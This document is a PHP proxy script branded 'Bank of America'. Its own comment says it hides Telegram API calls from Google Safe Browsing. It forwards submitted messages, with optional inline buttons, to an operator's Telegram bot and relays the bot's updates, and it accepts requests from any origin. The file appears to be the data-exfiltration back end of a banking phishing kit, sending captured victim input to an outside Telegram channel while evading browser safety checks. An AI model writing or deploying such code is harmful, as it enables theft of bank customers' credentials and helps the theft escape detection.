<?php
// Bank of America - Telegram API Proxy
// This file hides Telegram API calls from Google Safe Browsing

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit();
}

// Get JSON input
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid JSON']);
    exit();
}

// Check for action
if (isset($data['action']) && $data['action'] === 'getUpdates') {
    // Handle getUpdates request
    $token = $data['token'] ?? '';
    $offset = $data['offset'] ?? 0;
    
    if (empty($token)) {
        echo json_encode(['success' => false, 'error' => 'Missing token']);
        exit();
    }
    
    $url = "https://api.telegram.org/bot{$token}/getUpdates?offset={$offset}&timeout=10";
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode === 200) {
        echo $response;
    } else {
        echo json_encode(['ok' => false, 'result' => []]);
    }
    exit();
}

// Handle sendMessage request
$token = $data['token'] ?? '';
$chatId = $data['chat_id'] ?? '';
$message = $data['message'] ?? '';
$inlineKeyboard = $data['inline_keyboard'] ?? null;

// Validate required fields
if (empty($token) || empty($chatId) || empty($message)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Missing required fields']);
    exit();
}

// Prepare Telegram API request
$telegramUrl = "https://api.telegram.org/bot{$token}/sendMessage";

$payload = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

if ($inlineKeyboard) {
    $payload['reply_markup'] = json_encode([
        'inline_keyboard' => $inlineKeyboard
    ]);
}

// Send request to Telegram
$ch = curl_init($telegramUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Return response
if ($httpCode === 200) {
    $result = json_decode($response, true);
    if ($result && isset($result['ok']) && $result['ok']) {
        echo json_encode(['success' => true, 'data' => $result]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Telegram API error', 'response' => $result]);
    }
} else {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Failed to send message', 'http_code' => $httpCode]);
}
?>
